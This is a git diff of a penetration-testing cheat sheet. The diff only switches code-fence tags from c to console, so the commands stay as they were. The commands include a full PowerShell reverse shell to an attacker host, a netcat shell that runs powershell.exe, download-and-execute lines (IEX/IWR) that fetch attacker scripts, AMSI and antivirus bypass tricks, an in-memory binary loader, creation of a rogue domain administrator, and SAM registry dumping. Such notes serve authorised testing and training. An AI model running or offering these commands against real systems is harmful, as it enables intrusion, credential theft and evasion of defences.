 $ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 $ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
@@ -3886,13 +3892,13 @@ $ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 
 #### File Cleanup
 
-```c
+```console
 $ sed -i -e "s/^M//" <FILE>
 ```
 
 ## mkpasswd
 
-```c
+```console
 $ mkpasswd -m sha-512 <PASSWORD>
 ```
 
@@ -3900,7 +3906,7 @@ $ mkpasswd -m sha-512 <PASSWORD>
 
 ### Create Custom Charset
 
-```c
+```console
 $ mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard
 ```
 
@@ -3908,14 +3914,14 @@ $ mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard
 
 ### Converting .msg-Files to .eml-Files
 
-```c
+```console
 $ sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
 $ msgconvert *.msg
 ```
 
 ## Nano
 
-```c
+```console
 :Ex    // exit to folder structure
 :w!    // write content to a specific file
 :e!    // exit
@@ -3925,34 +3931,34 @@ $ msgconvert *.msg
 
 ### Common Commands
 
-```c
+```console
 $ nc <RHOST> <RPORT>
 $ nc -lvpn <LPORT>
 ```
 
 ### Port Scanning
 
-```c
+```console
 $ nc -nvv -w 1 -z <RHOSTS> <RPORT>-<RPORT>      // TCP
 $ nc -nv -u -z -w 1 <RHOSTS> <RPORT>-<RPORT>    // UDP
 ```
 
 ### Ncat with SSL
 
-```c
+```console
 $ ncat --ssl -lnvp <LPORT>
 ```
 
 ### UDP Listener
 
-```c
+```console
 $ nc -u <RHOST> <RPORT>
 $ nc -u -lnvp <LPORT>
 ```
 
 or
 
-```c
+```console
 $ nc -lnvup <LPORT>
 ```
 
@@ -3960,37 +3966,37 @@ $ nc -lnvup <LPORT>
 
 #### Listener
 
-```c
+```console
 $ nc -lnvp <LPORT> > <FILE>
 ```
 
 #### Remote System
 
-```c
+```console
 $ nc -w 5 <RHOST> <RPORT> < /PATH/TO/FILE/<FILE>
 ```
 
 #### Execute powershell.exe
 
-```c
+```console
 C:\temp\nc64.exe <RHOST> <RPORT> -e powershell.exe
 ```
 
 ### Scanning
 
-```c
+```console
 $ nc -zv <RHOST> <RPORT>
 ```
 
 ### Execute Shell Commands
 
-```c
+```console
 $ nc -nvlkp <LPORT> -c "cat /PATH/TO/FILE/<FILE>"
 ```
 
 ## Network File System (NFS)
 
-```c
+```console
 $ sudo useradd <USERNAME>
 $ sudo usermod -u <ID> <USERNAME>
 $ sudo su <USERNAME>
@@ -3998,7 +4004,7 @@ $ sudo su <USERNAME>
 
 ## NetworkManager
 
-```c
+```console
 $ sudo systemctl start NetworkManager
 $ sudo systemctl stop NetworkManager
 $ systemctl status NetworkManager
@@ -4006,7 +4012,7 @@ $ systemctl status NetworkManager
 
 ## NFS
 
-```c
+```console
 $ sudo useradd <USERNAME>
 $ sudo usermod -u <ID> <USERNAME>
 $ sudo su <USERNAME>
@@ -4014,14 +4020,14 @@ $ sudo su <USERNAME>
 
 ## nfsshell
 
-```c
+```console
 $ sudo apt-get install libreadline-dev libncurses5-dev
 $ cd nfsshell
 $ make
 $ ./nfsshell
 ```
 
-```c
+```console
 $ sudo ./nfsshell <RHOST>
 nfs> host <RHOST>
 Using a privileged port (1023)
@@ -4042,7 +4048,7 @@ nfs> ls
 
 ### Unpacking .asar-Files
 
-```c
+```console
 $ npx asar extract <FILE>.asar /PATH/TO/FOLDER/
 ```
 
@@ -4050,7 +4056,7 @@ $ npx asar extract <FILE>.asar /PATH/TO/FOLDER/
 
 ### Zone Update
 
-```c
+```console
 $ nsupdate -k key
 > server <RHOST>
 > zone <DOMAIN>
@@ -4061,7 +4067,7 @@ $ nsupdate -k key
 
 ### Read Commands from File
 
-```c
+```console
 nsupdate -k < <FILE>
 ```
 
@@ -4069,7 +4075,7 @@ nsupdate -k < <FILE>
 
 ### Check Binary Files
 
-```c
+```console
 $ objdump -D /lib/x86_64-linux-gnu/security/pam_unix.so | less
 ```
 
@@ -4077,13 +4083,13 @@ $ objdump -D /lib/x86_64-linux-gnu/security/pam_unix.so | less
 
 ### Switch User
 
-```c
+```console
 $ doas -u <USERNAME> /bin/sh
 ```
 
 ### Decrypt .enc-Files
 
-```c
+```console
 $ netpgp --decrypt <FILE>.tar.gz.enc --output=/PATH/TO/FILE/<FILE>.tar.gz
 ```
 
@@ -4091,7 +4097,7 @@ $ netpgp --decrypt <FILE>.tar.gz.enc --output=/PATH/TO/FILE/<FILE>.tar.gz
 
 ### Staring Outlook without a profile
 
-```c
+```console
 Ctrl + r
 outlook.exe /PIM NoEmail
 Enter
@@ -4101,7 +4107,7 @@ Enter
 
 ### Example
 
-```c
+```console
 $ cat <file>
 user1
 text1
@@ -4113,7 +4119,7 @@ text3
 
 ### Usage
 
-```c
+```console
 $ paste - - d, < <file>
 user1,text1
 user2,text2
@@ -4124,7 +4130,7 @@ user3,text3
 
 ### Command Execution
 
-```c
+```console
 $ sudo /usr/bin/perl -e 'exec "cat /root/root.txt"'
 ```
 
@@ -4132,7 +4138,7 @@ $ sudo /usr/bin/perl -e 'exec "cat /root/root.txt"'
 
 ### Interactive Shell
 
-```c
+```console
 $ php -a
 ```
 
@@ -4140,13 +4146,13 @@ $ php -a
 
 Important Note: Every Script there get's executed!
 
-```c
+```console
 $ sudo php -S 127.0.0.1:80
 ```
 
 ## pipenv
 
-```c
+```console
 $ pipenv shell
 ```
 
@@ -4154,7 +4160,7 @@ $ pipenv shell
 
 ### Remote Port Forwarding
 
-```c
+```console
 C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:3389 <LHOST>
 ```
 
@@ -4162,13 +4168,13 @@ C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:
 
 ### Fix .png-File Header
 
-```c
+```console
 $ printf '\x89\x50\x4e\x47' | dd conv=notrunc of=8.png bs=1
 ```
 
 ## POP3
 
-```c
+```console
 USER <USERNAME>
 PASS <PASSWORD>
 STAT
@@ -4193,13 +4199,13 @@ RETR <NUMBER>
 
 ##### LHOST
 
-```c
+```console
 $ ./chisel server -p 9002 -reverse -v
 ```
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
 ```
 
@@ -4209,13 +4215,13 @@ $ ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
 
 ##### LHOST
 
-```c
+```console
 $ ./chisel server -p 9002 -reverse -v
 ```
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ ./chisel client 192.168.50.10:9002 R:socks
 ```
 
@@ -4236,48 +4242,48 @@ $ ./chisel client 192.168.50.10:9002 R:socks
 
 > https://github.com/nicocha30/ligolo-ng/releases
 
-```c
+```console
 $ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
 $ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
 ```
 
 #### Prepare Tunnel Interface
 
-```c
+```console
 $ sudo ip tuntap add user $(whoami) mode tun ligolo
 ```
 
-```c
+```console
 $ sudo ip link set ligolo up
 ```
 
 #### Setup Proxy on LHOST
 
-```c
+```console
 $ ./proxy -laddr 192.168.50.10:443 -selfcert
 ```
 
 #### Setup Agent on APPLICATION SERVER
 
-```c
+```console
 $ ./agent -connect 192.168.50.10:443 -ignore-cert
 ```
 
 #### Configure Session
 
-```c
+```console
 ligolo-ng » session
 ```
 
-```c
+```console
 [Agent : user@target] » ifconfig
 ```
 
-```c
+```console
 $ sudo ip r add 172.16.50.0/24 dev ligolo
 ```
 
-```c
+```console
 [Agent : user@target] » start
 ```
 
@@ -4285,7 +4291,7 @@ $ sudo ip r add 172.16.50.0/24 dev ligolo
 
 - LHOST < APPLICATION SERVER > DATABASE SERVER
 
-```c
+```console
 [Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
 ```
 
@@ -4302,7 +4308,7 @@ $ sudo ip r add 172.16.50.0/24 dev ligolo
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ ip a
 $ ip r
 $ socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
@@ -4310,7 +4316,7 @@ $ socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
 
 ##### LHOST
 
-```c
+```console
 $ psql -h <RHOST> -p 2342 -U postgres
 ```
 
@@ -4329,7 +4335,7 @@ $ psql -h <RHOST> -p 2342 -U postgres
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 $ ssh <USERNAME>@192.168.100.10
 $ ip a
@@ -4340,7 +4346,7 @@ $ ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
 
 ##### LHOST
 
-```c
+```console
 $ smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
 ```
 
@@ -4357,14 +4363,14 @@ $ smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 $ ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
 ```
 
 ##### LHOST
 
-```c
+```console
 $ sudo ss -tulpn
 $ tail /etc/proxychains4.conf
 socks5 192.168.50.10 9999
@@ -4384,21 +4390,21 @@ $ proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=
 
 ##### LHOST
 
-```c
+```console
 $ sudo systemctl start ssh
 $ sudo ss -tulpn
 ```
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 $ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
 ```
 
 ##### LHOST
 
-```c
+```console
 $ psql -h 127.0.0.1 -p 2345 -U postgres
 ```
 
@@ -4415,14 +4421,14 @@ $ psql -h 127.0.0.1 -p 2345 -U postgres
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 $ ssh -N -R 9998 <USERNAME>@192.168.50.10
 ```
 
 ##### LHOST
 
-```c
+```console
 $ sudo ss -tulpn
 $ tail /etc/proxychains4.conf
 socks5 127.0.0.1 9998
@@ -4442,13 +4448,13 @@ $ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
 
 ##### APPLICATION SERVER
 
-```c
+```console
 $ socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
 ```
 
 ##### LHOST
 
-```c
+```console
 $ sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
 $ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
 ```
@@ -4467,14 +4473,14 @@ $ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
 
 ##### LHOST
 
-```c
+```console
 $ sudo systemctl start ssh
 $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 ```
 
 ##### WINDOWS JUMP SERVER
 
-```c
+```console
 C:\> where ssh
 C:\Windows\System32\OpenSSH\ssh.exe
 C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
@@ -4482,7 +4488,7 @@ C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
 
 ##### LHOST
 
-```c
+```console
 $ ss -tulpn
 $ tail /etc/proxychains4.conf
 socks5 127.0.0.1 9998
@@ -4503,20 +4509,20 @@ $ proxychains psql -h 10.10.100.20 -U postgres
 
 ##### LHOST
 
-```c
+```console
 $ find / -name plink.exe 2>/dev/null
 /usr/share/windows-resources/binaries/plink.exe
 ```
 
 ##### WINDOWS JUMP SERVER
 
-```c
+```console
 C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
 ```
 
 ##### LHOST
 
-```c
+```console
 $ ss -tulpn
 $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
 ```
@@ -4535,13 +4541,13 @@ $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
 
 ##### LHOST
 
-```c
+```console
 $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 ```
 
 ##### WINDOWS JUMP SERVER
 
-```c
+```console
 C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
 C:\> netstat -anp TCP | find "2222"
 C:\> netsh interface portproxy show all
@@ -4550,14 +4556,14 @@ C:\> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=T
 
 ##### LHOST
 
-```c
+```console
 $ sudo nmap -sS 192.168.50.10 -Pn -n -p2222
 $ ssh database_admin@192.168.50.10 -p2222
 ```
 
 ##### WINDOWS JUMP SERVER
 
-```c
+```console
 C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
@@ -4568,39 +4574,39 @@ C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.
 
 #### Installation on Linux
 
-```c
+```console
 $ sudo apt-get install gss-ntlmssp
 $ sudo apt-get install powershell
 ```
 
 ### Abbreviations
 
-```c
+```console
 ipmo    // Import-Module
 -wi     // WindowStyle Hidden
 ```
 
 ### General Usage
 
-```c
+```console
 PS C:\> Get-Help <COMMAND>
 ```
 
 #### Search for Files
 
-```c
+```console
 PS C:\> type <FILE> | findstr /l <STRING>
 ```
 
 #### Create Base64 Blob of a File
 
-```c
+```console
 PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
 ```
 
 #### Base64 Encoding using pwsh
 
-```c
+```console
 $ pwsh
 PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -4610,31 +4616,31 @@ PS> $EncodedText
 
 #### Import Module to PowerShell cmdlet
 
-```c
+```console
 PS C:\> Import-Module .\<FILE>
 ```
 
 #### Create a .zip File
 
-```c
+```console
 PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 #### Unzip a File
 
-```c
+```console
 PS C:\> Expand-Archive -Force <FILE>.zip
 ```
 
 #### Start a new Process
 
-```c
+```console
 PS C:\> Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
 ```
 
 #### Check PowerShell Versions
 
-```c
+```console
 PS C:\> Set-ExecutionPolicy Unrestricted
 PS C:\> powershell -Command "$PSVersionTable.PSVersion"
 PS C:\> powershell -c "[Environment]::Is64BitProcess"
@@ -4642,13 +4648,13 @@ PS C:\> powershell -c "[Environment]::Is64BitProcess"
 
 #### Check Execution Policy
 
-```c
+```console
 PS C:\> Get-ExecutionPolicy
 ```
 
 ##### Allow Script Execution
 
-```c
+```console
 PS C:\> Set-ExecutionPolicy remotesigned
 PS C:\> Set-ExecutionPolicy unrestricted
 PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
@@ -4656,14 +4662,14 @@ PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 
 ##### Script Execution Bypass
 
-```c
+```console
 PS C:\> powershell -ex bypass -File <FILE>.ps1
 PS C:\> powershell -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
 ### Invoke-Expression / Invoke-WebRequest
 
-```c
+```console
 PS C:\> iwr <LHOST>/<FILE>.ps1 -o <FILE>.ps1
 PS C:\> iwr http://<LHOST>/<FILE>.ps1 -o <FILE>.ps1
 PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1)
@@ -4672,13 +4678,13 @@ PS C:\> Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
 
 #### Use Kerberos Tickets
 
-```c
+```console
 PS C:\> iwr -UseDefaultCredentials http://<RHOST>
 ```
 
 ### .NET Reflection
 
-```c
+```console
 PS C:\> $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
 PS C:\> $assembly = [System.Reflection.Assembly]::Load($bytes)
 PS C:\> $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
@@ -4687,14 +4693,14 @@ PS C:\> $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
 
 ### PSCredential
 
-```c
+```console
 Import-CliXml
 Export-CliXml
 ```
 
 ### Switching Sessions in PowerShell
 
-```c
+```console
 PS C:\> $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
 PS C:\> Enter-PSSession -ComputerName <RHOST> -Credential $cred
@@ -4702,7 +4708,7 @@ PS C:\> Enter-PSSession -ComputerName <RHOST> -Credential $cred
 
 or
 
-```c
+```console
 PS C:\> $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
 PS C:\> $Session = New-PSSession -Credential $Cred
@@ -4711,7 +4717,7 @@ PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
 
 or
 
-```c
+```console
 PS C:\> $username = '<USERNAME>'
 PS C:\> $password = '<PASSWORD>'
 PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -4719,13 +4725,13 @@ PS C:\> $credential = New-Object System.Management.Automation.PSCredential $user
 PS C:\> Start-Process powershell.exe -Credential $credential
 ```
 
-```c
+```console
 PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
 
 ### Decryption
 
-```c
+```console
 PS C:\> $key = Get-Content ".\<FILE>"
 PS C:\> $pass = (Get-Content ".\<FILE>" | ConvertTo-SecureString -Key $key)
 PS C:\> $secret = (New-Object PSCredential 0, $pass).GetNetworkCredential().Password
@@ -4734,7 +4740,7 @@ PS C:\> echo $secret
 
 ### Scheduled Tasks
 
-```c
+```console
 PS C:\> Start-Job -ScriptBlock { C:\Windows\Tasks\<FILE>.exe }
 ```
 
@@ -4742,13 +4748,13 @@ PS C:\> Start-Job -ScriptBlock { C:\Windows\Tasks\<FILE>.exe }
 
 #### AntiVirus Bypass for Invoke-Expression (IEX)
 
-```c
+```console
 PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
 ```
 
 ##### Explaination
 
-```c
+```console
 $PSHome[4]     // equals "i"
 $PSHome[30]    // equals "e"
 +x             // adds an "x"
@@ -4756,13 +4762,13 @@ $PSHome[30]    // equals "e"
 
 #### Alternative
 
-```c
+```console
 PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
 ```
 
 ##### Explaination
 
-```c
+```console
 $eNV:COmSPeC[4]     // equals "i"
 $eNV:COmSPeC[15]    // equals "e"
 $eNV:COmSPeC[25}    // equals "x"
@@ -4772,13 +4778,13 @@ $eNV:COmSPeC[25}    // equals "x"
 
 #### Test String
 
-```c
+```console
 PS C:\> $str = 'amsiinitfailed'
 ```
 
 #### AMSI Bypass
 
-```c
+```console
 PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
 ```
 
@@ -4786,51 +4792,51 @@ PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
 
 #### Show current User
 
-```c
+```console
 PS C:\> whoami /all
 PS C:\> getuserid
 ```
 
 #### Show Groups
 
-```c
+```console
 PS C:\> whoami /groups
 ```
 
 #### Get System Information
 
-```c
+```console
 PS C:\> systeminfo
 ```
 
 #### Get Process List
 
-```c
+```console
 PS C:\> Get-Process
 ```
 
 #### Get net user Information
 
-```c
+```console
 PS C:\> net users
 PS C:\> net users <USERNAME>
 ```
 
 #### Get User List
 
-```c
+```console
 PS C:\> Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
 ```
 
 #### Invoke-Expression File Transfer
 
-```c
+```console
 PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
 ```
 
 #### Add new Domain Administrator
 
-```c
+```console
 PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
 PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
 PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
@@ -4838,7 +4844,7 @@ PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
 
 #### Execute Commands in User Context
 
-```c
+```console
 PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
 PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
 PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
@@ -4846,7 +4852,7 @@ PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage
 
 #### Execute Scripts with Credentials (Reverse Shell)
 
-```c
+```console
 PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
 PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
@@ -4854,7 +4860,7 @@ PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebCl
 
 #### New-PSSession
 
-```c
+```console
 PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
 $username = "<DOMAIN>\<USERNAME>"
 PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
@@ -4883,13 +4889,13 @@ whoami
 
 #### Check Port Status
 
-```c
+```console
 PS C:\> Test-NetConnection <RHOST> -p <RPORT>
 ```
 
 #### Connect to Azure
 
-```c
+```console
 PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
 ```
 
@@ -4897,79 +4903,79 @@ PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
 
 #### Out-Default
 
-```c
+```console
 PS C:\> &{ <COMMAND> }
 ```
 
 #### Read a File
 
-```c
+```console
 PS C:\> Get-Content <FILE>
 ```
 
 #### Show hidden Files
 
-```c
+```console
 PS C:\> Get-ChildItem . -Force
 ```
 
 or
 
-```c
+```console
 PS C:\> GCI -hidden
 ```
 
 #### Convert a File into Base64
 
-```c
+```console
 PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
 ```
 
 #### Directory Listing
 
-```c
+```console
 PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {ls 'C:\PATH\TO\DIRECTORY\'}
 ```
 
 #### Write to a File
 
-```c
+```console
 PS C:\> Invoke-Command -ComputerName <COMPUTERNAME> -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'C:\PATH\TO\FILE\<FILE>' -Value '<CONTENT>'}
 ```
 
 #### Move a File
 
-```c
+```console
 PS C:\> move-item -path C:\PATH\TO\FILE<FILE> -destination C:\PATH\TO\DESTINATION
 ```
 
 #### Create a .zip-File
 
-```c
+```console
 PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 #### Replace Text in File
 
-```c
+```console
 PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -ScriptBlock{((cat "C:\PATH\TO\FILE\<FILE>" -Raw) -replace '<TO_REPLACE>','cmd.exe /c <NEW_TEXT>') | set-content -path C:\PATH\TO\FILE\<FILE>} -credential $cred
 ```
 
 #### File Transfer
 
-```c
+```console
 PS C:\> &{ iwr -uri http://<LHOST>/<FILE>.exe -o 'C:\PATH\TO\DIRECTORY\<FILE>.exe'}
 ```
 
 #### Read PowerShell History
 
-```c
+```console
 PS C:\> type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 #### Read .lnk-Files
 
-```c
+```console
 PS C:\> $WScript = New-Object -ComObject WScript.Shell
 PS C:\> $shortcut = Get-ChildItem *.lnk
 PS C:\> $WScript.CreateShortcut($shortcut)
@@ -4977,7 +4983,7 @@ PS C:\> $WScript.CreateShortcut($shortcut)
 
 ## printf
 
-```c
+```console
 $ printf '<LINE1>\n<LINE2>'
 ```
 
@@ -4985,19 +4991,19 @@ $ printf '<LINE1>\n<LINE2>'
 
 ### Working Directory
 
-```c
+```console
 $ ls -l /proc/self/cwd
 ```
 
 ### Log File Read
 
-```c
+```console
 $ cat /proc/self/fd/10
 ```
 
 ## ProFTP
 
-```c
+```console
 $ SITE CPFR /home/<USERNAME>/.ssh/id_rsa
 $ SITE CPTO /var/tmp/id_rsa
 ```
@@ -5006,11 +5012,11 @@ $ SITE CPTO /var/tmp/id_rsa
 
 ### Add User to Database
 
-```c
+```console
 $ echo {md5}`echo -n <PASSWORD> | openssl dgst -binary -md5 | openssl enc -base64`
 ```
 
-```c
+```console
 mysql> INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('2', '<USERNAME>', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
 ```
 
@@ -5020,7 +5026,7 @@ mysql> INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count,
 
 > https://github.com/pypa/get-pip
 
-```c
+```console
 $ curl https://bootstrap.pypa.io/get-pip.py | python
 ```
 
@@ -5028,20 +5034,20 @@ $ curl https://bootstrap.pypa.io/get-pip.py | python
 
 ### Python HTTP Server
 
-```c
+```console
 $ python -m SimpleHTTPServer 80
 $ python3 -m http.server 80
 ```
 
 ### Python SMTP Server
 
-```c
+```console
 $ python3 -m smtpd -c DebuggingServer -n <LHOST>:25
 ```
 
 ### Virtual Environments
 
-```c
+```console
 $ python3 -m venv venv
 $ source venv/bin/activate
 $ deactivate
@@ -5049,70 +5055,70 @@ $ deactivate
 
 ### Unzip .zip File
 
-```c
+```console
 $ import zipfile;zipfile.ZipFile('<FILE>.zip','r').extractall('.');
 ```
 
 ### SyntaxError: invalid non-printable character U+200B
 
-```c
+```console
 $ sed -i 's/\xe2\x80\x8b//g'
 $ sed 's/\xe2\x80\x8b//g' <FILE> > <FILE>
 ```
 
 ### Shell Code Conversion
 
-```c
+```console
 $ python -c 'print "\x41"'
 ```
 
 ### Testing Web Sockets
 
-```c
+```console
 $ python3 -m websockets ws://<DOMAIN>
 ```
 
 ### Fixing Crypto Error
 
-```c
+```console
 $ pip3 install pycryptodome
 ```
 
 ### Running Binaries without touching Disk
 
-```c
+```console
 $ python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("<TEXT>"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'
 ```
 
 ## Python TOTP
 
-```c
+```console
 $ sudo pip3 install pyotp
 $ python3 -c 'import pyotp; totp = pyotp.TOTP("orxxi4c7orxwwzlo"); print(totp.now())'
 ```
 
 ## rdesktop
 
-```c
+```console
 $ rdesktop <RHOST>
 ```
 
 ## readpst
 
-```c
+```console
 $ readpst <FILE>
 $ readpst -rS <FILE>
 ```
 
 ## Redirects
 
-```c
+```console
 stdin     // value 0
 stdout    // value 1
 stderr    // value 2
 ```
 
-```c
+```console
 < redirects stdin
 > redirects stdout
 2> redirects stderr
@@ -5124,14 +5130,14 @@ stderr    // value 2
 
 `sudo` doesn't affect redirects.
 
-```c
+```console
 $ sudo echo <COMMAND> > /etc/<FOOBAR>    # does not work
 $ echo <COMMAND> | sudo tee /etc/<FOOBAR>    # does work
 ```
 
 ### Examples
 
-```c
+```console
 $ wc < <FILE>.txt                // redirect stdin
 $ cat <FILE>.txt | wc            // redirect stdin
 $ <COMMAND> > <FILE.txt > 2>&1    // redirect stderr to stdout
@@ -5142,12 +5148,12 @@ $ <COMMAND> > /dev/null           // OS ignores all writes to /dev/null
 
 ### Dumping Credentials
 
-```c
+```console
 PS C:\Users\user\Downloads> reg save hklm\system system
 PS C:\Users\user\Downloads> reg save hklm\sam sam
 ```
 
-```c
+```console
 C:\> reg.exe save hklm\sam c:\temp\sam.save
 C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save
